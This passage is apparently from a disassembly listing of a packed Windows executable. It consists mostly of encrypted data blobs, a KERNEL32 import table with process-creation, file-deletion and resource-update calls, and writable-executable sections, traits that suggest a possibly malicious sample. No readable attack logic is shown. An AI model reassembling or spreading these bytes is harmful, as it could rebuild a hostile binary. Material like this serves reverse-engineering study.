		dd 0B5487A38h, 0F8BC148Ah, 0F249CA6Bh, 8E791B22h, 61B88C24h
		dd 0F5E0D837h, 0EA8039DFh, 79586B86h, 40CEBE17h, 332CC639h
		dd 1861EF04h, 7435BF02h, 773A22F7h, 48319BC3h, 27B4951h
		dd 0FF68FB4Ch, 0DE9C3201h, 91DBC4BCh, 34FA21F3h, 3C048925h
		dd 0C1D7539Ah, 0F64268DAh, 0E700A636h, 0E2209840h, 0C6E160E5h
		dd 85BF1CC9h, 489AEEEFh, 6E68B76Eh, 522767Bh, 0D21479F4h
		dd 0F4E7440h, 50B08EF5h, 1B754C49h, 0CD647D38h,	0E9D08F93h
		dd 5A7E03CEh, 0EF540887h, 0F32F17ECh, 0B8CF9637h, 2BC419EFh
		dd 0E1D71A0Bh, 41B98D5Ah, 0C1CC6F59h, 965DD308h, 0AA9BB52Bh
		dd 6260BB79h, 0E66CC2F1h, 0BC66C3Eh, 139C803Bh,	0BB699A44h
		dd 6E1936E3h, 0CE1A989h, 81F56E24h, 106C5BE5h, 56485CB1h
		dd 0B0BCCCC9h, 946C1353h, 1B3EC29Bh, 72446B69h,	43957DA9h
		dd 0DCB79F1Bh, 0F9EB0F69h, 2A26ADF5h, 0DD4B1268h, 4CA31AD8h
		dd 52BE4ED2h, 0D33C2224h, 0F4828AA8h, 1B77B87Dh, 0EF78B8D2h
		dd 39A01596h, 7B1FCD0Ah, 898F6E82h, 0F20A9D18h,	6336DA5h
		dd 8927DDDBh, 0FFC9C878h, 0C5DEB8A6h, 0BA7F6F21h, 42D5A7CDh
		dd 80AE4008h, 7D7939F1h, 45B8D1DCh, 0E0433FB0h,	8E1D43BCh
		dd 0E7B0DB68h, 14BA2EACh, 0C1FECEE5h, 0FCA7D614h, 374A9AB5h
		dd 0EAB7443Ch, 0F952BD2Bh, 4B4D67C2h, 712584D8h, 0A53230E5h
		dd 7614F38Ch, 0C1E704B6h, 0A9870A97h, 3D633141h, 698198AFh
		dd 490C56A9h, 2CD21D32h, 0A6407B99h, 0D3A1C8A5h, 0F4B8E230h
		dd 83E4CBB4h, 23A149CBh, 0FB001FBCh, 7EE0868h, 63A6D374h
		dd 0EF3D2AC4h, 28BA7A62h, 0DC6EF46Ch, 0ED81447Dh, 0F7408BECh
		dd 90ABC79Fh, 42775EE4h, 0DEFA7912h, 37DE8C47h,	26973D35h
		dd 0A32ACC41h, 5DA3076Ch, 0FAAE0A1h, 0EAC18EB6h, 6F762E97h
		dd 2E01E98Fh, 3FC8D797h, 72F0DDBh, 0FBDECB48h, 0B44A59BEh
		dd 89C69625h, 8699BCEh,	798BA418h, 8FC3EC8Dh, 920297A4h
		dd 0FF78E359h, 31C883F7h, 3B22440h, 0D49F20C3h,	0FC7B60E4h
		dd 0EE8E9D9Ah, 7B3C94ADh, 75BE0E9Ah, 73C98096h,	1572377Bh
		dd 576E858Ah, 600F39CBh, 4EE95C20h, 9F783956h, 9328CC1Eh
		dd 0F16F11BCh, 350BCFEh, 64A702A8h, 0EEDF9598h,	60EFD47Ch
		dd 0D1082A9Dh, 0CF98FBD7h, 0EE4516A3h, 0B5104B5Bh, 0FC0FF971h
		dd 1764896Bh, 0D63C17FFh, 2A493A5Ah, 273AE342h,	0A3B7E071h
		dd 1AA97903h, 0DB8B8503h, 0BB73AA71h, 78ED7387h, 0F53EC1ACh
		dd 160E0C20h, 88508A96h, 7D8CCDE9h, 9ADCB995h, 0B86591D6h
		dd 8B461B75h, 737308FBh, 592C8434h, 0F00CDFE9h,	6661E2F7h
		dd 0FD5C6B38h, 0DF752189h, 78E338CFh, 3A7C179Bh, 0DF225661h
		dd 801BF2CBh, 8E4A2CD9h, 87389B7Ah, 0F3C536Ah, 0F2CB9C37h
		dd 0FED3551Fh, 2AA4A40Eh, 0FFC96D33h, 8DDD96FFh, 9A46A584h
		dd 0F52A5C9Eh, 0B078317Bh, 3F055004h, 0AB71ED40h, 7FB61E76h
		dd 2614BF85h, 2F21ABF2h, 51168D26h, 0E9578798h,	3D695368h
		dd 2D33696Eh, 9A5243E8h, 9F42ECFBh, 0DFA1B818h,	0FC39C2D2h
		dd 0C3E1775h, 41E6CE03h, 8E7DD0D5h, 779E3192h, 3975FCD5h
		dd 50FE6E67h, 1F9924B6h, 2DA0707Eh, 0D684CECAh,	1033A609h
		dd 2CAFEDB3h, 0D3B7E62Bh, 0F876339Ch, 0FEC7CA74h, 0D98C819Eh
		dd 0FA299D56h, 0E04B6C4Dh, 0C4F99631h, 666888Fh, 81E2C8A1h
		dd 0C8FFE6A5h, 0FC9A6DFFh, 97B4D885h, 58F0A57Eh, 0FB525465h
		dd 13F6AB28h, 56032D96h, 0C898171Ch, 0C34213EFh, 7AC34213h
		dd 727AC342h, 3E040849h, 3B932E62h, 24D805CBh, 702D626Ah
		dd 61BBB6A5h, 9C425012h, 3587624Fh, 4C544D05h, 47E7275Bh
		dd 4ABC8BABh, 9D096E18h, 8FDAE064h, 31BBFA84h, 0D36AB255h
		dd 4F1962h, 0E990F867h,	48C76B36h, 740AEA0h, 52125943h
		dd 10D26BC3h, 621AA666h, 8214B3Dh, 0D279850Ch, 43CFBFDFh
		dd 568E5B1Ch, 0C116DEh,	0DB1CC773h, 3 dup(0)
		db 0
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_404495 ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva EnumResourceNamesW ; Import Address Table
		align 4
		dd 4 dup(0)
		db 0
;
; Import names for KERNEL32.dll
;
off_404495	dd rva word_404503	; DATA XREF: .text:__IMPORT_DESCRIPTOR_KERNEL32o
		dd rva word_404519
		dd rva word_404528
		dd rva word_404536
		dd rva word_404548
		dd rva word_40455A
		dd rva word_404572
		dd rva word_40458C
		dd rva word_40459C
		dd rva word_4045BC
		dd rva word_4045D2
		dd 0
_text		ends

;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; BOOL __stdcall EnumResourceNamesW(HMODULE hModule, LPCWSTR lpType, ENUMRESNAMEPROCW lpEnumFunc, LONG_PTR lParam)
		extrn EnumResourceNamesW:dword ; DATA XREF: .text:0040447Do
; BOOL __stdcall DeleteFileW(LPCWSTR lpFileName)
		extrn DeleteFileW:dword
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
		extrn HeapCreate:dword
; HANDLE __stdcall FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
		extrn FindFirstFileW:dword
; BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR	lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES	lpThreadAttributes, BOOL bInheritHandles, DWORD	dwCreationFlags, LPVOID	lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,	LPPROCESS_INFORMATION lpProcessInformation)
		extrn CreateProcessA:dword
; BOOL __stdcall GetProcessIoCounters(HANDLE hProcess, PIO_COUNTERS lpIoCounters)
		extrn GetProcessIoCounters:dword
; BOOL __stdcall DebugActiveProcessStop(DWORD dwProcessId)
		extrn DebugActiveProcessStop:dword
; BOOL __stdcall QueryActCtxW(DWORD dwFlags, HANDLE hActCtx, PVOID pvSubInstance, ULONG	ulInfoClass, PVOID pvBuffer, SIZE_T cbBuffer, SIZE_T *pcbWrittenOrRequired)
		extrn QueryActCtxW:dword
		extrn CreateProcessInternalWSecure:dword
; BOOL __stdcall EndUpdateResourceW(HANDLE hUpdate, BOOL fDiscard)
		extrn EndUpdateResourceW:dword
; BOOL __stdcall GlobalUnlock(HGLOBAL hMem)
		extrn GlobalUnlock:dword


; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 4044F5h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .text:00404479o
		db 0
word_404503	dw 149h			; DATA XREF: .text:off_404495o
		db 'EnumResourceNamesW',0
		db 0
word_404519	dw 105h			; DATA XREF: .text:00404499o
		db 'DeleteFileW',0
		align 4
word_404528	dw 6563h		; DATA XREF: .text:0040449Do
		db 'HeapCreate',0
		align 2
word_404536	dw 1A7h			; DATA XREF: .text:004044A1o
		db 'FindFirstFileW',0
		align 4
word_404548	dw 0C5h			; DATA XREF: .text:004044A5o
		db 'CreateProcessA',0
		align 2
word_40455A	dw 33Bh			; DATA XREF: .text:004044A9o
		db 'GetProcessIoCounters',0
		align 2
word_404572	dw 0EBh			; DATA XREF: .text:004044ADo
		db 'DebugActiveProcessStop',0
		align 4
word_40458C	dw 6975h		; DATA XREF: .text:004044B1o
		db 'QueryActCtxW',0
		align 4
word_40459C	dw 0CBh			; DATA XREF: .text:004044B5o
		db 'CreateProcessInternalWSecure',0
		align 4
word_4045BC	dw 12Bh			; DATA XREF: .text:004044B9o
		db 'EndUpdateResourceW',0
		align 2
word_4045D2	dw 614Eh		; DATA XREF: .text:004044BDo
		db 'GlobalUnlock',0
		align 20h
		dd 280h	dup(?)
_text		ends

; Section 2. (virtual address 00005000)
; Virtual size			: 00010000 (  65536.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00000000
; Flags	C0000080: Bss Readable Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Uninitialized
; Segment permissions: Read/Write
rdata		segment	para public 'BSS' use32
		assume cs:rdata
		;org 405000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		dd 112Ah dup(?)
		db 2 dup(?)
word_4094AA	dw ?			; CODE XREF: start+2545j
					; DATA XREF: start+9o ...
		dd 10EFh dup(?)
		db ?
byte_40D869	db 3 dup(?)		; DATA XREF: start+D62o
		dd 3 dup(?)
		db ?
byte_40D879	db 3 dup(?)		; DATA XREF: start+C83o start+C91o
		db 3 dup(?)
byte_40D87F	db ?			; DATA XREF: start+378o start+212Co
		dd 3Ah dup(?)
dword_40D968	dd ?			; DATA XREF: start+1BEFo
		db 2 dup(?)
word_40D96E	dw ?			; DATA XREF: start+79o	start+89o
		dd 1Fh dup(?)
		db 3 dup(?)
byte_40D9EF	db ?			; DATA XREF: start+89Eo start+8AEo ...
		dd 2 dup(?)
		db ?
byte_40D9F9	db 3 dup(?)		; DATA XREF: start+136Ao
		dd 1Ch dup(?)
		db 2 dup(?)
word_40DA6E	dw ?			; DATA XREF: start+210Co
		dd 3 dup(?)
		db 3 dup(?)
byte_40DA7F	db ?			; DATA XREF: start+270o start+1015o ...
		dd 1Ah dup(?)
		db ?
byte_40DAE9	db 3 dup(?)		; DATA XREF: start+10E8o
		db 2 dup(?)
word_40DAEE	dw ?			; DATA XREF: start+241Co
		dd 1Eh dup(?)
		db ?
byte_40DB69	db 3 dup(?)		; DATA XREF: start+F2o	start+100o ...
		dd 3 dup(?)
		db 3 dup(?)
byte_40DB7B	db ?			; DATA XREF: start+1387o
		dd 1Bh dup(?)
byte_40DBE8	db ?			; DATA XREF: start+24C9o start+24D7o
byte_40DBE9	db 3 dup(?)		; DATA XREF: start+141Do start+142Bo
dword_40DBEC	dd 1Fh dup(?)		; DATA XREF: start+1E2Do start+1E47o ...
		db 2 dup(?)
word_40DC6A	dw ?			; DATA XREF: start+929o
		dd 4 dup(?)
		db 3 dup(?)
byte_40DC7F	db ?			; DATA XREF: start+1FC2o start+1FD0o
		dd 5Ah dup(?)
dword_40DDE8	dd 5 dup(?)		; DATA XREF: start+1872o start+1882o
		db 2 dup(?)
word_40DDFE	dw ?			; DATA XREF: start+171o start+181o
		dd 1Eh dup(?)
byte_40DE78	db 3 dup(?)		; DATA XREF: start+14B2o start+14C3o ...
byte_40DE7B	db ?			; DATA XREF: start+2Ao	start+38o ...
		dd 40h dup(?)
dword_40DF7C	dd 20h dup(?)		; DATA XREF: start+15B1o start+15C1o
byte_40DFFC	db ?			; DATA XREF: start+421o start+42Fo ...
byte_40DFFD	db 2 dup(?)		; DATA XREF: start+1717o start+1725o
byte_40DFFF	db ?			; DATA XREF: start+D0Eo start+D1Bo
		dd 61Bh	dup(?)
		db ?
byte_40F86D	db 2 dup(?)		; DATA XREF: start+C08o
byte_40F86F	db ?			; DATA XREF: start+143Eo start+144Co ...
		dd 3 dup(?)
		db ?
byte_40F87D	db 3 dup(?)		; DATA XREF: start+24FFo
		dd 1Eh dup(?)
		db 2 dup(?)
word_40F8FA	dw ?			; DATA XREF: start+1BBDo start+1BD8o
		dd 1Bh dup(?)
		db 3 dup(?)
byte_40F96B	db ?			; DATA XREF: start+1519o
		db 2 dup(?)
word_40F96E	dw ?			; DATA XREF: start+9Eo
		dd 3 dup(?)
		db 3 dup(?)
byte_40F97F	db ?			; DATA XREF: start+770o start+1467o ...
		dd 1Ah dup(?)
byte_40F9E8	db 2 dup(?)		; DATA XREF: start+166Do start+2284o ...
word_40F9EA	dw ?			; DATA XREF: start+169Eo start+16B9o
		dd 3Fh dup(?)
dword_40FAE8	dd ?			; DATA XREF: start+194Fo
byte_40FAEC	db 3 dup(?)		; DATA XREF: start+3o start+14o ...
byte_40FAEF	db ?			; DATA XREF: start+1B07o
		dd 2 dup(?)
		db 2 dup(?)
word_40FAFA	dw ?			; DATA XREF: start+280o
dword_40FAFC	dd 1Fh dup(?)		; DATA XREF: start+F1Eo
		db ?
byte_40FB79	db 3 dup(?)		; DATA XREF: start+7C8o start+7D6o
		dd 1Fh dup(?)
		db 3 dup(?)
byte_40FBFB	db ?			; DATA XREF: start+1F8Co start+1F9Ao
		db 3 dup(?)
byte_40FBFF	db ?			; DATA XREF: start+B33o
		dd 1Fh dup(?)
		db ?
byte_40FC7D	db 3 dup(?)		; DATA XREF: start+17C0o start+17CEo
		dd 1Eh dup(?)
dword_40FCF8	dd 21h dup(?)		; DATA XREF: start+DB8o start+DC6o
		db 2 dup(?)
word_40FD7E	dw ?			; DATA XREF: start+1C60o start+250Do
		dd 5Ah dup(?)
		db ?
byte_40FEE9	db 2 dup(?)		; DATA XREF: start+17A0o
byte_40FEEB	db ?			; DATA XREF: start+1DBo start+1E9o ...
		dd 24h dup(?)
		db 2 dup(?)
word_40FF7E	dw ?			; DATA XREF: start+252Fo
		dd 1Ah dup(?)
		db ?
byte_40FFE9	db 3 dup(?)		; DATA XREF: start+4B8o
		dd 1405h dup(?)
rdata		ends

; Section 3. (virtual address 00015000)
; Virtual size			: 00010800 (  67584.)
; Section size in file		: 0000A800 (  43008.)
; Offset to raw	data for section: 00003A00
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
_data		segment	para public 'CODE' use32
		assume cs:_data
		;org 415000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		dd 6F4283E3h, 50DFDCB9h, 3A43AD82h, 2E1D1A16h, 0EC30C745h
		dd 0C0F03243h, 0B3DB0352h, 0D6AEBEDCh, 0AE41BA92h, 9EA69022h
		dd 0FE3B51EEh, 0AC9F6952h, 4CBDBAB7h, 2F292A8h,	88674FD4h
		dd 5B67816Ah, 0E96D7220h, 626461ECh, 39878207h,	5150C68Bh
		dd 0DB7500CEh, 5F519850h, 1192F383h, 0D16CD904h, 0CF0F0279h
		dd 3A6D82Ch, 0F9AC560Eh, 76BCA7D0h, 97BF6E15h, 0A2065EF7h
		dd 0CF9003DEh, 0A2891C61h, 0FD2C742Dh, 9B58C666h, 54C006E7h
		dd 26D6300Dh, 0E552777Bh, 45F71D9Fh, 752F159Dh,	0F51B15h
		dd 67D59559h, 0A4175E1Ah, 0DDB537FBh, 55BE0BC7h, 3F33F6F1h
		dd 935F772Ch, 8237A67Ah, 7E320CCCh, 0A033A0F3h,	45E9BA7Eh
		dd 0BE78FAC5h, 9ADFAE76h, 26A21DBBh, 4CC024AFh,	0EBE0A7EFh
		dd 0B5B2D34Ah, 2664C5h,	0F3A5661Ah, 851A30C3h, 2D8623E2h
		dd 82A7736Ch, 7668125Fh, 0E0E5185Fh, 0E0003A13h, 60C0D32Bh
		dd 2CD1439Fh, 0ED0074B2h, 0E53EBBEBh, 0B3ECB4F3h, 3980647Bh
		dd 86F90E75h, 67A8C122h, 621D2F79h, 6A5D9114h, 0E156C653h
		dd 0F543D90Ah, 8FA2EAF3h, 956BD2E3h, 0A651CA29h, 2B9600D1h
		dd 0C28F8B04h, 0B2D97021h, 324362BEh, 0B59FB5D4h, 272100AAh
		dd 7F6DE3E5h, 9920BF5h,	0E34F22D2h, 34054F31h, 780CF9DEh
		dd 620AD7CFh, 0AA6A3925h, 1CFF2BBh, 0F6CAC744h,	30126B4h
		dd 4E19BAE2h, 58662A1Dh, 8B99919Ch, 6BC606F6h, 8E752667h
		dd 4765EB8Bh, 44C8ADEDh, 20C0078h, 7CF21E11h, 722B1F90h
		dd 0A1C4641Ah, 3998CCFCh, 44639D56h, 6EDDC403h,	0B0C8313Ch
		dd 642A3956h, 4466E26Ah, 0A18D57Bh, 91B637FFh, 1B7B39ACh
		dd 0A9AF5754h, 80A83B11h, 6FC4852Ah, 0C7085B4Fh, 0E0D27626h
		dd 0DAD28A3Bh, 0EF2BE88Dh, 17290270h, 0D481C0CDh, 7F2B0B4Ch
		dd 0FFF0D801h, 876D7005h, 0F6FC9BDCh, 0F93AE405h, 22783BD6h
		dd 3EEFDAFh, 0DEA109Fh,	872D2ADFh, 0B1B81442h, 0C2DEB692h
		dd 26B3D461h, 4BA26220h, 0A65CA117h, 8ECC18C5h,	8168A3A5h
		dd 82F3E0D7h, 96443FDDh, 0BCEA21DBh, 2F2116DAh,	0EACF068h
		dd 62F59227h, 174816DEh, 0CBB4BBDh, 3250092h, 103E9C5Ch
		dd 0C49AD7CBh, 0BCF3AE91h, 7FA8F458h, 2CB71769h, 0FC9DA399h
		dd 61AE0C20h, 17ACF354h, 0C0682F9Bh, 0A225CEA0h, 0E3D3FBF9h
		dd 0C97458FAh, 0EC67B0F2h, 2D88FE92h, 0BA43E34Dh, 9B9A356Ah
		dd 6DCB9F5Dh, 479D9E4Eh, 47C4863h, 2BF730h, 0EFFA9118h
		dd 0BB990B15h, 0F7D1EB96h, 11E4AF32h, 0E928A3B5h, 14829D73h
		dd 80B0CD89h, 629F401Ch, 0F26158A5h, 0EC131B02h, 0B98B8B4h
		dd 14E5143Ch, 303CDFC7h, 0E204A1C2h, 0C25F3C84h, 23D1E062h
		dd 37E9B710h, 0DCBEB940h, 50BD4003h, 542A7518h,	752939B0h
		dd 545B6A1Bh, 741BBB12h, 0B3190E46h, 57C5B637h,	833DE618h
		dd 0D06E8F1Eh, 91EC1C02h, 9A95E859h, 0FC7EDCF8h, 29F5CF2Bh
		dd 45210545h, 0A7156264h, 9ADD80A8h, 0B57E395Bh, 7F2AB276h
		dd 7799416Ch, 360153F7h, 0AB60595Ch, 6D65CB0Eh,	5621786Ch
		dd 1E81356Dh, 0B6FAF7FBh, 0DDDDC52Bh, 0D7F0650Dh, 0F615FCECh
		dd 77D32A3Ah, 7E14B45Fh, 0EEBC3953h, 3AE2B9CAh,	0B7A93BFBh
		dd 28C04D68h, 729C45D2h, 2D6F8146h, 26758EAFh, 17F6ADB9h
		dd 0EFB7644Dh, 6F5EB759h, 0EAC773E3h, 0D40CC238h, 0D7CEDE7h
		dd 1A2A8BAAh, 0B9C40BDFh, 0EF6652CBh, 4DC84466h, 51DF8ACAh
		dd 23090E11h, 1306F2BAh, 0D59BD233h, 0C76BF6FFh, 4C56FD5Dh
		dd 0F48130ACh, 0AE5E570h, 0BF04F303h, 0A3DC08DBh, 7B4B6E5Bh
		dd 0FACE560Eh, 0FECB19CCh, 78D122B7h, 0F734B921h, 12098FC5h
		dd 0D80DE486h, 0F432C85Eh, 3955F7F7h, 2F4A00DCh, 0E0712181h
		dd 96276EEh, 808FF4CCh,	0C62E890Ch, 7E74BA04h, 8C69819Eh
		dd 0C9AB8AA1h, 0BF59B242h, 0FA47664Ah, 0C6B10686h, 3EFE714Bh
		dd 92191209h, 0D650CDDBh, 0D0D5120Fh, 6D41D87Eh, 0B230BEF9h
		dd 4091DC31h, 0B779FC7Eh, 0BCBE5EEh, 44919D6Ah,	0E5636F93h
		dd 8FDE8984h, 8EA84809h, 0EFFDD457h, 20FEF9Ah, 0AD55633Dh
		dd 918B6FA8h, 0F76A5482h, 0EC6A029Ch, 0D33CC9C0h, 9EEF9ED3h
		dd 0AD95021Ch, 0E50E6C96h, 9FD141D8h, 0F1631668h, 0C7857224h
		dd 0E60E9269h, 818F9392h, 0E4560B16h, 1F449FB5h, 7A24DBB3h
		dd 4B3F2EA7h, 575058AEh, 0DCBA0F24h, 0BA22E970h, 0EDA0A2D3h
		dd 9BA206CBh, 992ACBADh, 0E044DB6Ah, 1929700Eh,	6D676E2Eh
		dd 0EC00E245h, 4AEEE921h, 171DFD12h, 469AB95h, 0D7EB6C62h
		dd 5FC51576h, 402307CCh, 0C36498h, 98FF5B9Bh, 79F89112h
		dd 6B2A177Bh, 0A12A612Bh, 603249Dh, 0ADE55E57h,	0E299466Ah
		dd 0FB547620h, 94B48AF9h, 0C3F710D7h, 0A04DD73Eh, 593CC7A7h
		dd 0F791D6EEh, 0BED8780Bh, 8075C323h, 1DA991BEh, 2F09C5EEh
		dd 3D65D6B0h, 3497FA75h, 0E71B9EDAh, 2EC397E4h,	0C93B90D4h
		dd 9B8FEE97h, 0F708E02Ch, 96209A8Fh, 821E7B9Fh,	61A9E466h
		dd 0E9068128h, 84080DDDh, 326F4075h, 0B7EC1FBCh, 0B7C8AA8Eh
		dd 99FF3891h, 548A351Dh, 39328E5Dh, 0F6C33BF2h,	0A12C1254h
		dd 1B21EF93h, 8AA8A2D2h, 0E0AA0DE1h, 94233BC4h,	0D6711683h
		dd 0CA2540Bh, 0EBF2B6C9h, 63FD856Dh, 0C8BADE7Ch, 0ED6297A6h
		dd 0F8FFA81Ah, 93D56D22h, 83E8442Fh, 0BE7D013Ch, 0C22AD866h
		dd 6762E4AAh, 0B96D6BACh, 6CBBBEBh, 463C13A0h, 2DFD8E8Eh
		dd 0DF3EBC67h, 0C1A7A629h, 0E62C8CF7h, 0FF0D4425h, 0E0B50806h
		dd 21847556h, 8C1916AAh, 0CE9CD122h, 17F4FDD2h,	173B8C4Fh
		dd 5DA21317h, 76D37FCh,	92F615F7h, 1C5016EFh, 0FDF54D61h
		dd 0F191DD6Ah, 269856FFh, 0A89041D7h, 2A67A884h, 2F6AC9A7h
		dd 0E87EBB5Ch, 0C6A7EB90h, 0D627C986h, 0F838900Bh, 10C7855Eh
		dd 0F6BEB537h, 0B8FC94CCh, 36FDC18Dh, 368F78D9h, 921CE28Bh
		dd 4275E622h, 0CA2CBEA7h, 339306ACh, 0B44D919h,	4F15D3Ah
		dd 2A421410h, 0A6325E90h, 0C488440Dh, 0A4F51BEFh, 981D3F83h
		dd 86E08FF2h, 155FD143h, 0D1DD993Eh, 230DC7B5h,	56B4BF3Bh
		dd 417B3EF7h, 0FC1D18h,	4674DCFBh, 3FF426CCh, 91583BAFh
		dd 2E35B3B6h, 4BE6FA37h, 0BBD09094h, 10E517A7h,	5DD8F5E3h
		dd 0DCAF520h, 3DC4B2F0h, 0FE5FF387h, 5EAF641h, 0BE8F126Ch
		dd 6DA67DDEh, 9B2F851Eh, 0B7516598h, 0FF9792C1h, 419D7FD2h
		dd 0BBD678F2h, 8405B3C8h, 77EEF41Ah, 1CD5A321h,	17BB5285h
		dd 259C921Ch, 0CF701879h, 5E307276h, 1110D50Eh,	82A7719Ch
		dd 0EBFFB5D6h, 0D053AE59h, 78CB9ECh, 81860D68h,	37F9F74h
		dd 49794FBDh, 0AB98C699h, 695FD62Ch, 980C8196h,	6F71FBE1h
		dd 0CAF2F29Dh, 282154E3h, 0A55C9E45h, 0DBC7495Bh, 0F5436CD3h
		dd 363E99D9h, 5CE8877Ah, 567E453Ah, 20D543CCh, 0B0527047h
		dd 5843BDB4h, 957A6475h, 96FE0351h, 0F8D4BA6Ah,	2DCCFD9Fh
		dd 0FD883E2Eh, 7606E76Ch, 5385AEBh, 89F5D19Dh, 688B924h
		dd 8AE3BD62h, 0A4CB6828h, 5D950223h, 7E0A19F9h,	23D02C2Dh
		dd 81053E12h, 510F915Ch, 0C0A9F27h, 997F55A9h, 0C1DFCD14h
		dd 8FEB90D7h, 6624A81Dh, 26F671C2h, 0AB3B513Dh,	0F174B407h
		dd 0A7FC6482h, 0AFB61A36h, 9BAC7D7Eh, 254AE476h, 0E73E08BFh
		dd 0CA5E1F8Dh, 0AF7162E2h, 3BDB94A4h, 0DC216D93h, 0CF4F2EEFh
		dd 0DC2B330Dh, 9C23055Eh, 0F1DAA5B0h, 3CD2A988h, 0DD6FA4C0h
		dd 22151124h, 0C0307E90h, 0CFC711FCh, 9DDF3CD8h, 9287DF8h
		dd 0CDF8BA4Bh, 804924EBh
		dd 73889508h, 0A45315CCh, 9A072F92h, 0E31596E1h, 0D4757788h
		dd 706D8F17h, 0BA057A08h, 588A635Fh, 584F5A2Fh,	7927ABE0h
		dd 4DD5DD1Eh, 38F92FA7h, 9D5AB58Ch, 5D30A700h, 2B75EEF4h
		dd 8BDC4028h, 1F362913h, 0E427ABA2h, 0BA3D365Eh, 0E370538Ch
		dd 703D00B8h, 8AE1F435h, 20538A01h, 27E6F7BDh, 0EDCCB414h
		dd 7CEC5445h, 106C7726h, 2D9CCE60h, 0B250426Bh,	0FBFE62D9h
		dd 0B3AE93E6h, 0BA2BDAB2h, 0C5398B61h, 4F4D5438h, 0DA1E9D3Ah
		dd 629C502Ch, 1EC8ADADh, 0F8D13947h, 1EB57492h,	0CCA7AAA8h
		dd 0D8A6D67Dh, 6918C5D8h, 0BF87E338h, 0DE6A09D4h, 3B8B27F9h
		dd 553F4F6Bh, 0CB295CBh, 0C9F1C5ADh, 32483833h,	0D82030B7h
		dd 4061C30Ah, 22C99268h, 0B4200630h, 4B630017h,	8E03A92Fh
		dd 0E64974DCh, 0B020A8DFh, 0E34A37DFh, 0B11E701Ch, 923C0DDCh
		dd 29538CE6h, 6D0689C8h, 14AD2C9Ch, 0B7DF902Dh,	41A53A80h
		dd 6C852D0Bh, 73E3A5CBh, 0F06738E2h, 0CDDF12Eh,	6EB68338h
		dd 6951DCABh, 4177BAD2h, 64E7CC4Bh, 0AC8FCC64h,	883D028Ah
		dd 86FF182Fh, 0A8073DC1h, 15C6EB2Eh, 2A3583E4h,	0C288D19Dh
		dd 10066C3Ch, 0AD94C338h, 0C0582CCBh, 6FD042D2h, 3664F7A0h
		dd 4B03D5DCh, 0BDB5E203h, 9FE675C7h, 52C1E5DCh,	2F19705Fh
		dd 0A7A934ADh, 0C556BAEAh, 8393DE93h, 4A85628Dh, 8E0D17ADh
		dd 11330E03h, 0D4C35CF0h, 99A1332Ah, 0F14CF51Ah, 191AF3CCh
		dd 30F64620h, 306DAB2Fh, 0C84F027Ah, 1A442FCFh,	95D6A09Eh
		dd 1753B96Dh, 2E2929FBh, 0E2458E37h, 76E81365h,	904469AEh
		dd 0C684AFB1h, 0B87223EFh, 0E33965BFh, 9125ED37h, 389FCBE9h
		dd 0A527499Ch, 0A3F673C9h, 744ACE42h, 9C8AA152h, 0D6B4E0EBh
		dd 41D39D39h, 0A5D59B53h, 0CB8017F3h, 833318DFh, 67A14169h
		dd 733D462Ch, 859BE657h, 0B293832Bh, 38CCDC6Fh,	5FB045Fh
		dd 2FE2F6FDh, 0CF5DFE98h, 515E4A0Ch, 1848AFA7h,	734C07E3h
		dd 3532D6D1h, 29E182CEh, 139DCC1Fh, 52381B04h, 14C8DF67h
		dd 74FC67B6h, 14DD25DEh, 4B226A52h, 90027777h, 59347065h
		dd 0EA0E0E59h, 0A7E375FDh, 483617A8h, 1FBF0913h, 0E2A943F8h
		dd 9C01EBA7h, 0C3AE6F68h, 2575DFC5h, 0FE9DB700h, 144455D0h
		dd 0C87BA8BFh, 0FD1AC167h, 3321AC7Ch, 9456C2A1h, 4B4D8F6Dh
		dd 3EBF6956h, 3601172Fh, 7013FAE8h, 63357E87h, 2CA839D1h
		dd 8C67DBC8h, 92E422B1h, 0D8622E49h, 10E9AFECh,	979D3F55h
		dd 90CB0C99h, 89BD417Ch, 5C039A95h, 0A628E6A6h,	3C9E3319h
		dd 0A2DCABFFh, 991B9504h, 0FB7DB1Dh, 0E3D0EDA4h, 0F8178307h
		dd 0BA419D09h, 6D36346Bh, 0B188FB0Ah, 0EDA8F9A3h, 0FFBF8F6h
		dd 0D2843AF3h, 0FF8021CAh, 79EA51B0h, 0A35AE486h, 1A04C6D1h
		dd 16603004h, 8F763DD2h, 0C06E2C5Dh, 3A9C29h, 32BB7703h
		dd 352C4D29h, 0E665CD72h, 8DA6E598h, 0A67BED22h, 35774B10h
		dd 0E876ABF6h, 697871BAh, 5D797272h, 25EE923Ch,	50190483h
		dd 14C21E3Fh, 0A355B37Dh, 0AF4B1ACCh, 1953BD25h, 0A3735EF7h
		dd 0C108C8A3h, 29D81262h, 570EA674h, 595FFCD9h,	198AE235h
		dd 0F845F438h, 5106DC06h, 0D0C290D2h, 3408B682h, 0B4AA95EEh
		dd 4BF0DA2Bh, 6BF4923Dh, 7EF645BDh, 0DE3F64EAh,	973E7668h
		dd 0FAA3187Bh, 0A065FF07h, 8975E7B0h, 1CF6934h,	0F84391A5h
		dd 0CFAAD882h, 17A69F3Bh, 882133E7h, 7768A6B4h,	386099B9h
		dd 5BCEB5A2h, 0EC6AC55Bh, 6BEBB165h, 0CA03A914h, 0EC81CD16h
		dd 0B7B72410h, 4E8E891Bh, 60DCD5F0h, 3141EB48h,	35249A81h
